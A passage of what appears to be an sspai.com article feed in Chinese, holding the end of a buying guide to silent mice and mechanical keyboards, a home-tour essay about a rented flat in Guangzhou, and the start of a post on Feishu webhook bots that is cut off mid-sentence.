alt=\"\"></figure><p>上图从左到右依次为房间底噪、普通鼠标点击、普通键盘敲击。从分贝数就可以看出，对于人耳来说，这样的声音在<strong>强度</strong>上称不上「吵」。问题在于，它们的声音和房间的噪声相比，过于<strong>尖锐和集中</strong>，让人不得不顺着声音的方向调整注意力——这是经过千万年进化写进基因用来规避危险的好方法，躲都躲不过。所以，静音外设的目标，主要就是以下三点中的任意几点：</p>\n<ol>\n<li>让机身结构更稳定，避免出现空腔或不必要的碰撞；</li>\n<li>在可能发生机械接触的部分采用缓震材料；</li>\n<li>更换材料，让声音不集中在某个频段。</li>\n</ol>\n<p>如何才能达成这些目标呢？这就要牵扯到键盘和鼠标的触发结构了。</p>\n<h3>在轴体上加东西</h3>\n<p>在量产外设还处于莽荒状态时，不说静音，甚至「消噪」都不算大众需求。在薄膜键盘普及之前，计算机使用者的选择屈指可数；而在普及之后，机械键盘的使用者往往追求的就是薄膜键盘上丢失的声响和特殊手感。毕竟薄膜键盘的硅胶材料和薄膜电路结构具有先天优势，只要做工、用料和设计上稍稍用心就能避免几乎所有杂声（虽然它们很多都没这么干）。静电容键盘也是类似，由于提供手感的结构是胶碗，且触发过程中没有物理结构的接触，它同样只需要在机身结构上做文章就能解决问题。我在 <a href=\"https://sspai.com/post/64972\" target=\"_blank\">机械键盘选购指南</a> 和 <a href=\"https://sspai.com/post/66102\" target=\"_blank\">破解静电容键盘迷思</a> 两篇文章中对触发结构有一些解释。</p>\n<p>那么，问题就落在了机械键盘上。想让机械键盘静音，就需要作为触发结构和主要发声位置的轴体达到「静音」的水平。</p>\n<p>2015 年，Cherry 参考此前的诸多静音轴体（比如类 Alps 轴体结构的 Matias Quiet Linear，来自目前唯一在售的量产类 Alps 轴体键盘厂商 Matias），发布了 Cherry MX Silent，也就是静音红轴。这款轴体的发布激起了更多轴厂的兴趣，它们纷纷开始研发自己的静音轴体。</p>\n<p>我拆解两颗带有静音设计的 TTC 轴体作为示例：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrsdb34t82k08gbqg.jpeg\"><figcaption>月白轴（上）轴心未做静音处理，轴底有缓冲；静音茶轴轴心有处理。</figcaption></figure><p>图中上方轴体为 TTC 月白轴，下方为 TTC 静音茶轴。静音轴体的基本思路就是这两个轴体的综合：在有机械碰撞的部分添加缓冲材料，比如硅胶。</p>\n<p>Cherry 静音红轴的静音思路是将硅胶放在轴心滑轨的上下两个端点。在轴体活动时，这两处会和轴体的上下盖发生碰撞，因此直接在这里增加缓冲，就可以减少噪音。佳达隆、凯华两家轴厂也采用的是这个思路。我手里的 TTC 是在轴心的中间加上一个缓冲垫，同时在轴底也增加了一块硅胶垫，轴心触底和触顶也能得到缓冲。两种设计本质上没有好坏之分，都能达成静音效果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrstb34t818p9aq70.jpeg\"><figcaption>TTC 静音茶轴轴底缓冲垫（白色）</figcaption></figure><p>如果说有什么不同的话，Cherry 的静音轴体有近些年的通病：弹簧音重、手感沙涩。如果遇到键盘本身壳体空腔较多，可能噪音还是比较大，而且只有线性轴可选。国产的凯华、TTC 和佳达隆相比之下体验就好上不少，它们也提供了不同的手感选择。</p>\n<h3>换一个微动结构</h3>\n<p>而到鼠标这边，情况又和机械轴体不太相同。</p>\n<p>现有的微动结构决定了，要想让机械微动静音，就需要把「弹片」的声音降到最低。出于成本考虑，微动的生产厂商不可能为了达到静音效果专门设计类似光轴的光学微动（事实上，即使是能够自行研发微动的鼠标厂商如富勒、雷蛇、双飞燕等，为了维持机械微动的手感以留住更多用户，也不会在光微动中完全放弃「弹片」）。所以它必须兼容现有的三针脚微动的标准，即在按下时，前中两脚接通，松解时，前中两脚断开。但很显然，在现有的三针脚微动结构上没办法做静音操作。</p>\n<p>如果你仔细观察了上面微动的结构图就会发现，三针脚微动的第三根针脚其实并不参与触发。因此，市面常见的静音微动的原型其实是两脚的方形微动，它的结构更利于降低声音，也可以和采用了三针脚微动的电路板兼容，降低开发成本。</p>\n<figure class=\"ss-imgRows\" figcaption=\"组件更加简单，右图为弹片，注意边缘的弧度。\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrt5b34t818p9aq7g.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrtdb34t813bf10p0.jpeg\" alt=\"\"></figure><p>我破拆了一颗市面上评价较好的凯华静音微动。这种方形静音微动的内部结构更加简单——既然你要接通前两个针脚，那用一块铁片连通他们就好了。按钮推动推杆，推杆压迫下方边缘翘起的圆形弹片，按下时弹片中心下压，接触触点，连通两针脚，按键触发——就像是你去玩一个底被压弯了的铁托盘，每压一次它就「哐啷」响一声。静音微动就是靠这个极小的金属盘触发。</p>\n<p>这样的结构最大化地减小了弹片的运动范围，有一点蝶式键盘触发的灵魂（但是比那个结构安静得多）。在方形微动这么狭窄的封装中，弹片尺寸也十分小巧，如果选用较软较薄的弹片，整体音量可以降得非常弱。当然这样做也自然有它的缺陷，下一节会提到。</p>\n<p>那么最重要的，<strong>采用了这些静音结构的外设，能安静到什么程度呢</strong>？</p>\n<p>就静音效果而言，在我的实测中，静音鼠标和静音机械键盘的表现类似，在极近距离（收音设备与外设紧贴）下，开关触发时，噪声强度从 40dB 提升至 43dB，在相隔超过 50cm 之后，分贝值就不再上升，噪声频谱上也看不到明显的变化。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrttb34t82dsrfom0.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4osru5b34t818p9aq80.jpeg\" alt=\"\"></figure><h2>如何买到合格的静音外设</h2>\n<p>如果你去各个网上商城随便搜搜「静音鼠标」「静音键盘」就会发现，「静音」已经被商家当成一个引流词，甚至有些离谱的便宜键盘，把「仿青轴手感」和「静音」标在一起。如果因为这些误导宣传遭受了室友的打狗棒法，绝对是有苦难言。</p>\n<p>那么，怎么样才能买到像样的静音外设呢？</p>\n<h3>如果你要买全新装备</h3>\n<p>如果你真的舍不得自己手里外设的手感，或是从一开始就打算弄一套静音外设，我在这里推荐一些型号，可以作为参考。你也可以按照挑选的原则自行筛查。</p>\n<p>⚠️️ 静音机械键盘和静音鼠标的手感都会与常规键盘有所不同，相当于<strong>用手感换音量</strong>，无论是触感还是声音的点击反馈都会变弱，一部分人可能难以习惯，鼠标尤为明显，购买时请自行权衡。</p>\n<h4>鼠标</h4>\n<p>鼠标的挑选原则十分简单：如果你拿不准自己相中的型号到底是不是真正的静音鼠标，直接搜索「型号 + 拆解」或者「型号 + 微动」。只有采用了方形静音微动的鼠标才是你想要的「静音鼠标」，其他的要么是挂羊头卖狗肉，要么是选了绵软差劲、但是不够静音的微动，靠关键词准备忽悠一波。</p>\n<p>由于静音鼠标的主要阵地是办公，所以基本都没有搭载游戏级引擎。玩玩休闲游戏摸鱼还可以，如果要认真打竞技游戏，尤其是 FPS，最好还是采用改造的方法。</p>\n<ul><li><strong>罗技 M590</strong></li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/7491a39de1b3e0f8b7eae1b699429ec0.jpg\"></figure><p>其实对手长的兼容性很不错，实际握感比观感大一些。</p>\n<p>罗技的 M590 是 M585 的亲兄弟，两款鼠标的差别就是一个用了普通微动，一个用了静音微动。支持两台设备切换，优联 2.4G 与蓝牙双模，支持罗技 Flow 跨屏，带侧键而且搭载了四向滚轮，基本上你能在办公中用得上的功能它都搭载了。我自己选择的静音鼠标就是这个型号，有一点人体工学的弧度，标称续航一节五号碱性电池可以能用 24 个月。除了滚轮的手感比较松垮——其实浏览文件的时候也不算什么大毛病——别的基本没什么问题，作为一个办公鼠标它算是齐活了。罗技的静音鼠标有不少型号可以选择，比如 <strong>M330</strong> 等经典型号。罗技的鼠标在详情里有单独标注「静音」的都可以，主要是功能强弱和设计上有点差别。</p>\n<ul><li><strong>小米无线蓝牙双模鼠标静音版</strong></li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/03/5ea8b66a4622341fdcbc2cb651ef012f.png\"></figure><p>采用蓝牙与 2.4G 无线双模配置以及凯华的静音微动，小米的这款双模静音鼠标在 69 元的价位可能不算特别吸引人，但它在线下就能轻松买到——无需等待是它最大的优势，买完直接顺手扔在办公室，一气呵成。需要注意的是，小米鼠标几乎每个型号都有非静音版和静音版，购买前需要认清版本。但是我并不推荐便携鼠标系列的静音版，原因很简单，长时间使用扁平的鼠标对手掌和手腕不太友好，出于同样的原因，<strong>除非经常出差或外带</strong>，我也不推荐购买罗技的 Pebble。</p>\n<h4>键盘</h4>\n<ul><li>薄膜键盘 / 静电容键盘</li></ul>\n<p>如果你对机械键盘没什么硬性要求——比如不打游戏，或者预算有限，不要犹豫，直接买薄膜键盘。如果你的预算充足，同时对游戏有一些要求，也可以购买静电容键盘。硅胶作为手感结构的这两个品类在静音这方面可以说有先天优势，但在挑选时同样要上心。</p>\n<p>关于静电容键盘，我在 <a href=\"https://sspai.com/post/66102\" target=\"_blank\">这篇文章</a> 中已经有过详细的介绍，这里只说购买建议。如果你的预算非常充裕，而且希望尝试顶级静电容键盘，直接购买 Realforce 的<strong>静音版</strong>或<strong>联名版</strong>，如果能接受 HHKB 布局，也可以购买 HHKB <strong>Type-S </strong>版本。只有这些版本是带有静音圈的，普通版推杆与键帽晃动的声音并不算小，空格的空腔音也比较明显。如果预算不太充裕，可以选择 Niz，全系标配静音圈，只是手感偏软。</p>\n<p>至于薄膜键盘，挑选时尽可能选择剪刀脚结构（比如我在 <a href=\"https://sspai.com/post/67355\" target=\"_blank\">这篇文章</a> 中提到的微软 Sculpt）或者较矮键帽的火山口结构（比如我在 <a href=\"https://sspai.com/post/64972\" target=\"_blank\">这篇文章</a> 中提到的联想 SK8825），这些结构基本能保证在轻轻敲击时提供一个较低的音量。键帽越高越容易不稳定，产生碰撞和晃动杂音的可能越高。比较离谱的是有一些宣称自己是「电竞仿青轴」的薄膜键盘也会在名称里加上「静音」两个字，购买时要睁大眼睛。</p>\n<ul><li>机械键盘</li></ul>\n<p>到了机械键盘这边，你有两种选择，一种是购买一把搭载了静音轴体的键盘，一种是购买一把支持轴体热插拔的键盘，然后选择静音轴体自行更换。</p>\n<p>支持热插拔的键盘已经很多了，大家大同小异，你可以根据喜好购买一把支持「<strong>轴座热插拔</strong>」的机械键盘。之所以强调「轴座」是因为一部分厂商使用的是套筒热插拔，这种热插拔对轴体的轴脚粗细有要求。不少国产厂商都有比较优质的热插拔键盘，比如腹灵、AKKO、Keydous、达尔优等，大部分配置拉满，出厂配备夹心棉与底部消音垫，和静音轴体配合更好；国际品牌中罗技也有支持热插拔的键盘，只是单价较高。</p>\n<p>如果你不愿意尝试热插拔轴体，也可以购买出厂预装静音轴的键盘。</p>\n<p><strong>AKKO 3098B/N</strong> 的部分配色出厂搭载了 TTC 的静音红轴 V3，键盘支持有线、2.4G 以及蓝牙三模切换，并且支持轴体热插拔。键盘配置了夹心垫和底部消音垫。我自己有一把这个键盘，拿来当试轴器用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrutb34t818p9aq8g.png\"></figure><p><strong>悦米机械键盘 Pro 静音版</strong>出厂搭载 TTC 静音红轴，这把键盘的特点是经常打折，而且是铝制 CNC 外壳，在打折时性价比极高。缺点是供货不稳定，时常缺货。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrv5b34t82k08gbr0.png\"></figure><p>此外，IKBC、IQUNIX、杜伽以及老牌的 Leopold、Filco 等经常采用樱桃轴的厂商也有搭载 Cherry 静音红轴（粉轴）的键盘出售，但樱桃静音红轴的实际体验比较一般，如果不是真的很喜欢或者真的很便宜，不推荐作为首选购买。</p>\n<h3>改造现有装备</h3>\n<p>如果你已经有了一套外设不想更换，或者静音鼠标的性能没办法满足游戏需求，那你可能需要试试给自己现在的外设装备来个改造。</p>\n<p>具体的教程我就不谈了，鼠标和键盘的拆解、微动和轴体的更换、电烙铁的使用等等都有详细的视频教程，可以在 B 站自行搜索。我主要来讲讲你可能需要的配件。</p>\n<h4><strong>鼠标</strong></h4>\n<p>如果你平常打的游戏对传感器的要求比较高，或者你已经习惯了自己手里的鼠标模具，而且有对静音有比较高的需求，不妨试试自行更换微动。</p>\n<p>⚠️️ 静音微动由于弹片的性质和对音量的平衡要求，手感会非常绵软，点击确认感会大打折扣。</p>\n<p>市面上售卖的静音微动中，普遍评价比较好的就是<strong>凯华的静音微动</strong>，也就是我在上文中破拆的红点方形微动。除此之外，还有一些更便宜的品牌可选，但大体上手感都不会更加优秀。在购买前最好查一下自己手上的鼠标所用的微动型号以及尺寸，看看是否有人出过该型号更换微动的教程或视频。比如罗技的游戏鼠标由于采用微动主动张力系统，拆解上可能更为复杂。少数型号可能出现微动高度不兼容的情况。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrvdb34t813bf10q0.jpeg\"><figcaption>凯华静音微动（红点），注意与凯华红点微动（GM 4.0，非静音）区分</figcaption></figure><p>值得一提的是，ROG 这样具有微动热插拔功能的鼠标<strong>并不能</strong>兼容方形微动，两者虽然针脚定义通用，但宽度尺寸上还是差别很大的。所以如果你打算购买鼠标自行更换微动，还是选择原生焊接机械微动的型号比较合适，就别想着靠热插拔省事儿了——除非你自己焊接热插拔铜鸡眼，那就是更大的工程了。</p>\n<h4><strong>键盘</strong></h4>\n<p>同样地，如果想达到最好的静音效果，方法就一个：换轴。目前市售的不少键盘其实都配备了热插拔功能。如果你正好有把热插拔键盘，买好静音轴体，十五分钟你就能把机械键盘搞成静音版；如果是焊接轴……那就练练手活吧。</p>\n<ul><li><strong>轴体</strong></li></ul>\n<p>目前市售的轴体中，静音效果和手感平衡比较好的，是凯华和 TTC（正牌科电）出品的轴体。</p>\n<p>TTC 目前售卖的静音轴体有 TTC 静音茶轴 V2 Pro，TTC 红静轴（静音红 V3），TTC 白静轴（静音月白）。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4osrvtb34t818p9aq90.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4oss05b34t82dsrfoo0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4oss0db34t813bf10qg.png\" alt=\"\"></figure><p>三种轴体分别对应了茶轴（段落轴）、红轴（线性轴）以及 HP 轴（提前大段落轴）三种常见手感，整体静音效果不错，手感表现也比较稳定。此外还有全透明线性手感的冰静轴可供选择。TTC 静音轴体均价大约在每颗 2.2~4 元左右。闲鱼可能有批发或二手出售，可以酌情考虑。</p>\n<p>凯华目前售卖的静音轴体主要是凯华 Silent BOX Red（静音粉轴）、Silent BOX Brown（静音茶轴）以及凯华 Master BOX 煎蛋轴。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4oss0tb34t82k08gbrg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4oss15b34t813bf10r0.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4oss15b34t82k08gbs0.png\" alt=\"\"></figure><p>其中，粉轴和煎蛋轴都是线性轴，茶轴是段落轴。凯华静音粉轴在闲鱼有热插拔拆机二手可选。全新价格均为约 4 元/颗。</p>\n<p>其他轴厂的轴体中也有静音效果不错的，比如高特的静音白、灰、黄轴，均价在 1 元左右，但品控略差且需要注意是否轴脚带套筒/支持轴座热插拔；佳达隆出品的有静音版白、红、黑、茶轴，静音效果不算特别强但比常规轴体小；还有 Boba、Zilent、Aliaz 等定制轴体。</p>\n<ul><li><strong>一些「消音」设备</strong></li></ul>\n<p>在改造过程中，你可能会搜索到下图所示的「静音垫圈」，这种东西更大的作用是套在键帽上缩短键程，对减小声音并没有什么作用，充其量是降低音调，不推荐购买。</p>\n<p>此外，还有一些在键盘底部填充的「静音棉」以及夹在 PCB 板和定位板之间的「消音垫」。如果你要换轴的话，可以尝试这些东西，但它们并不能让你有声的键盘静音。这些消音设备的目的是填充键盘空腔，减少共鸣与回响，可以让有声的轴体声音更干净，静音的轴体更安静。可如果你的键盘本身声音巨大，只想靠塞底棉让它变静音，基本是不可能的。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4oss1db34t82k08gbsg.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4oss1lb34t813bf10rg.png\" alt=\"\"></figure><p>以上就是关于静音外设的介绍和分享了。希望你在寝室和办公室能少受一些身边人的注视。</p>\n<p>如果你用过好用的静音外设，或者对外设挑选有自己的见解，欢迎在评论区参与讨论。</p>\n<p><strong>关联阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/66327\" target=\"_blank\">用过 30 多款游戏鼠标后，我想聊聊如何筛选到趁手利器</a></li>\n<li><a href=\"https://sspai.com/post/66102\" target=\"_blank\">破解「退烧」迷思：7 个问题带你了解静电容键盘</a></li>\n<li><a href=\"https://sspai.com/post/67354\" target=\"_blank\">手腕救星还是烧钱摆件？聊聊人体工学键盘</a></li>\n<li><a href=\"https://sspai.com/post/64972\" target=\"_blank\">买了 10 多款机械键盘之后，我想聊聊如何找到「完美手感」</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 💻</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68599"},{"title":"2000 块钱，在广州租下并鼓捣一个可以装进梦想的家丨下","date":"2021-09-06 06:21:20","description":"\n<p>在我看来，一个地方之所以被称为「家」，不仅仅只是因为它能让我安眠，更因为它足够大且通透的空间，而不至于让我感到压抑和沉闷。无论春夏秋冬，阳光穿过飘窗荡漾进房间的时刻，唤醒了新的一天的同时，也悄悄偷走了我在深夜 emo 后的焦虑。</p>\n<p>从我的卧室走出来，紧连着的便是客厅。它是整个房子最大的地方，连接着大门和阳台，以及其它各个房间。在从前住的房子里，它总是得不到太阳的浸润，只能通过一方小小的窗户偶然窥见吝啬的阳光。而现在，一个朝北且和整个客厅侧面面积一般大的玻璃门，让漫反射后的阳光可以肆无忌惮地在这里流淌，从前的昏暗被彻底清扫一空。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/3bcd54fcdd4ba0cbd688b6adf6ab9218.jpg\"></figure><h2>客厅</h2>\n<p>相比起房间，客厅的改动则相对少了很多，基本保留了刚租下来时的样子。</p>\n<p>进门之后，最明显的家具便是沙发。沙发是房东原来的，考虑到还是租房，暂时也就没有更换的计划，但也不影响使用的舒适感。而我们的故事，也将从这里开始。所以，请落座。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/f45c568748adbcc33baf25a5717d0d35.jpg\"></figure><p>坐在沙发上，正前方面对的是一面白墙。从左到右分别是一面落地的大镜子和风扇，接着就是一个长柜子。在这个柜子上是整个房子的数据中心，包括智能家居网关、NAS 和无线路由器都集中在这片区域。右侧是一个未使用的饮水机和一些杂物。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/83fef6a7a6434a16c862e88b870e9aa7.jpg\"></figure><p>而上面一大片白墙，或许你已经想到了什么。没错，它是一片投影的区域，投影仪正好就放在沙发的右边。通过 3 米多长的距离，即使是侧投也能投出差不多 110 寸大小的区域。约上朋友周末来家里做个饭，酒足饭饱后一起看部电影或是综艺，喝一杯纯手调奶茶，也是非常惬意的生活。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/9533ec25d9a55a9b2fd875bd181225e0.gif\"></figure><p>投影仪右侧则是一个书架，书架上除了书之外，还有一些海报和智能家居设备，包括 Apple TV 也在这里。旁边的落地灯是客厅主要的氛围照明之一，可以根据场合调整不同亮度和颜色。例如在派对模式下是最亮亮度的暖黄色，而在观影模式下，则是幽暗的海蓝色。下面的毛毯上，有时还能看见冰冰躺在这里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/beb0f5b1f5bf5dcfd0f7440c30aa5a45.jpg\"></figure><p>由于客厅比较大，因此我布置了四个音响。除了长柜子上的两个之外，沙发的两侧还放了一对 HomePod mini。在用 Apple TV 看视频时，可以同时让这四个音响一起发声。或是平时在房间工作累了，在沙发上瘫着打开 Apple Music 听音乐，也是不错的选择。</p>\n<p>来到沙发左侧，原本的饭桌已经变成了一个简易的台面，用来承载水壶和制冰机，以及一些茶叶和水杯。至于吃饭，我们则是将它转移到了茶几上，毕竟沙发的高度也不高。当然，在有需要的时候，饭桌也是可以抽出来使用的 —— 就像之前的 Potluck，大家围在桌前边吃边分享自己的故事。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/c5bc90c4cb5a226539f87159e1ff0060.jpg\"></figure><p>在这里，我要重点表扬一下制冰机。冰箱虽然能制冰，但牺牲掉了速度和易用性，并且更容易产生健康问题。而制冰机只需要加水，短短十分钟内就能出冰，耗电也比冰箱低很多。对我这种冬天也喜欢喝冰水的人来说，实在是必需品 —— 每天早上洗漱完来上一杯冰水，让人精神十足。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/e01831bd92955558dfbb500d06e9b5a6.gif\"></figure><p>最边上，我用一个大的架子将微波炉、烤箱和消毒柜竖着并列放在一起，大大节省了空间，同时冰箱也就在旁边，要取用对应的物品时也非常容易。冰箱上贴着的则是家里的 Wi-Fi，朋友来家里做客只需要一扫就能自动连接，不用再繁琐地问密码。</p>\n<p>鞋柜我想就不用多介绍了，但鉴于我的鞋子确实多，所以有一些拖鞋摆到了下面，这可能也是种无奈吧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/94b5e18f55f0382de4da7899dd5877b7.png\"></figure><p>整个客厅自然也是接入了智能家居，通过手机或是 Siri 都可以控制它们。不过为了懒到底，我还给制作了一些卡片，只要手机一碰上去就能自动触发场景。例如，用手机碰一下茶几上的「观影时刻」，就会让落地灯调整成 50% 亮度的蓝色并关闭其他灯光，接着打开客厅风扇，同时唤醒 Apple TV 和投影仪。</p>\n<h2>厨房 / 卫浴 / 阳台</h2>\n<p>这三个区域是改动最小的地方，毕竟要动这些地方的话，很大程度上要从硬装上翻修。在还没有拥有自己的房子之前，我想它们应该会一直陪我到离开这里吧。</p>\n<h3>厨房</h3>\n<p>对于厨房最大的改动，是我在原来的柜子里嵌入了一台洗碗机。</p>\n<p>当我搬到这里时，我也曾经考虑将洗碗机放在灶台旁边。然而高温、接排水等问题，让我一度想将它转手。直到有一次我发现最外侧的橱柜中层隔板是可拆的，而且里面正好还有足够大的走线孔和电源插座，所以我便突发奇想，尝试将洗碗机整个嵌入到橱柜中。</p>\n<p>结果一试发现，这个橱柜简直是为这台洗碗机量身打造的。无论是宽度还是深度，都十分完美。于是，我便拿出了从小在五金店家庭长大的功夫，从洗菜池下方改出一条管道，通过煤气灶下方的孔引入水源连接到洗碗机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/e79ee3eb8f8e8dc8b85b24b051e7953f.jpg\"></figure><p>解决了入水管之后，出水管的问题却暂时拦住了我。由于出水管不能爬太高的坡，不能和进水管一样走上方的孔。为了解决这个问题，我也想过在橱柜下方内侧再用电钻出两个出水孔。但在查看情况时我发现，洗菜池和燃气灶下方的两块木隔板有大约 3 厘米的空隙，打孔并不是那么方便，最主要的是这也涉及到硬装修改了，因此这个方案的成本会比较高。</p>\n<p>在一筹莫展时，我想到阳台还有一块之前装不锈钢支架时剩下来的钢板，就把它拿过来垫在了洗碗机下面，将洗碗机的出水软管从下面引出到柜外，然后再在下方通过一根塑料管连接到洗菜池的排水管内。恰好厨房下面的橱柜还是离地突出来一段的，隐藏掉了排水管，在视觉上不会造成突兀。</p>\n<p>自从洗碗机之后正式上岗之后，我们做饭终于勤快多了，也一劳永逸解决了吃完饭谁都不想洗碗的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/9a118f30aa0415c65df8ed0dc365cfcf.jpg\"></figure><p>哦对了，厨房也放了一个音响，具体的型号是索尼 X77 。原本它是在我桌面上当电脑音响用的，但是它的体积实在是比较大，在桌面放了增高架之后就不够位置了，所幸就把桌面的音响换成了 Bose Soundlink Mini II，把它拿到厨房用了。</p>\n<h3>卫浴</h3>\n<p>对我来说，在看房的时候有一条必须要避雷的点：电热水器。在夏天或许没有太大问题，一旦天气转凉之后，抢着洗澡或者等着它烧热水可不是什么很好的体验。所以当时我在看到这套房子用的是燃气热水器，而且比其他房子干净卫生十倍时，对它的好感度便倍增。</p>\n<p>不过其实我对于卫浴的改动基本也是没有的，仅仅是放置了一些个人卫生用品和洁具。不过和其他卫浴不同的是，我还在柜子的顶部放了个 HomePod mini。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/59507021b1c117d5474cbe6a23a70559.jpg\"></figure><p>其实，洗澡的时候或许是最适合听歌的时候之一。HomePod mini 的好处除了便宜音质好之外，而且还抗水汽，非常适合放在干湿分离的浴室使用。更惬意的事情是，它能够完美融入家里的智能家居生态：直接喊一声 Siri，音乐就在整个卫浴间荡漾了。</p>\n<h3>阳台</h3>\n<p>由于没有杂物间，其实阳台在某种程度上来说变成了一块杂物堆放地，还有一面挂在阳台外的彩虹旗。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/88e96b8e97f9a37795dc9a3c6723af20.jpg\"></figure><p>不过，这里更多时候是作为冰冰的乐园：各种架子，各种箱子，还有可以随时眺望远方的视野。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/58d208f70ce5791576b98ed4015b9cdb.jpg\"></figure><p>你问我为什么不放它进来？其实冰冰是室友的猫。一般来说猫猫进来是没问题的 —— 当然，在家里拉屎拉尿了除外。室友已经被这个问题困扰了很久，他时常在早晨睡醒来之后发现，冰冰又把粑粑或者尿拉在了我俩房间门口，于是怒而将它关在阳台。</p>\n<p>其实冰冰还是比较害羞的，来客人的时候都会躲起来。唯独我俩在家的时候，它就皮的像个欠揍的小孩子。不过真要陪它玩的时候，它倒是很乖，静静地躺在我的腿上。</p>\n<p>有道是「带猫写稿，效率倍高」。但键盘上长猫的时候，我还是会忍不住逗它玩。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/b94b9bc8450ae43bf541dbca6fe94326.jpg\"><figcaption>主子の不屑</figcaption></figure><h2>最后</h2>\n<p>在即将写完这篇文章的时候，我和 @Microhoo 聊天，关于买房子和工作的事情。</p>\n<p>小虎有一句话点醒了我，他说，我觉得你和我一样，也是那种有了一个可以自己折腾的属于自己的房子会非常幸福快乐的人。而且，你在逃离了办公室成为数字游民或者自由职业者之后，未来应该也不会再去干那种朝九晚五的工作了，要么就是类似少数派这种创意型的远程工作，要么就是自媒体自由职业者。</p>\n<p>我说，是啊，但是现在的我还被很多东西捆着。在裸辞接近一个月的时间，我还会为很多事情去焦虑 —— 容貌、身体、经济和感情，种种难言，毕竟想成为自己想成为的样子，还要在经历很多肉体和内心上的痛楚，以及花掉目前还无法估量的钱。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/9ce0407b813bf7e3f03e61813cfaaff9.jpeg\"></figure><p>然而也正是在这差不多一个月的时间里，我也才真的有时间去想清楚一件事：得为谁活着？</p>\n<p>室友是个相对传统的人，经常会为买房和婚姻焦虑。尽管我经常和他说，没事的，其实只要你不跟着内卷，人家再怎么卷，其实也影响不到你。但我却也希望他能达到他所想要的生活，因为对于绝大多数人来说，这条路虽然辛苦，却总有一些寄托能够让人欣慰。</p>\n<p>他为了未来的憧憬而活，而我现在是想为自己的快乐而活。不管是自由职业还是数字游民，我想我现在也有一定能力去做点自己想做的事情了。有些东西总会要迈出第一步的，曾经无比惧怕镜头的我，也终于要直面它了。</p>\n<p>我喜欢广州，喜欢这个我精心打造的安身之处，也喜欢带着朋友来感受我所生活的场所。但，那个想去海岛开 Underground Music 小酒吧的我，倒也还活在内心的角落里。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/24/1fc8e600f883decff6fa42fc7ea1fed2.jpeg\"></figure><hr>\n<h4>扩展阅读</h4>\n<p><a href=\"https://sspai.com/post/68122\" target=\"_blank\">2000 块钱，在广州租下并鼓捣一个可以装进梦想的家丨上</a></p>\n","link":"https://sspai.com/post/68454"},{"title":"手把手教你用飞书 Webhook 打造一个消息推送 Bot","date":"2021-09-06 03:35:39","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<h2>前言</h2>\n<p>作为一个互联网的「数字难民」，我最讨厌的就是在工作中使用微信。因为微信本质上并不属于<strong>工作性质</strong>的 IM（Instant 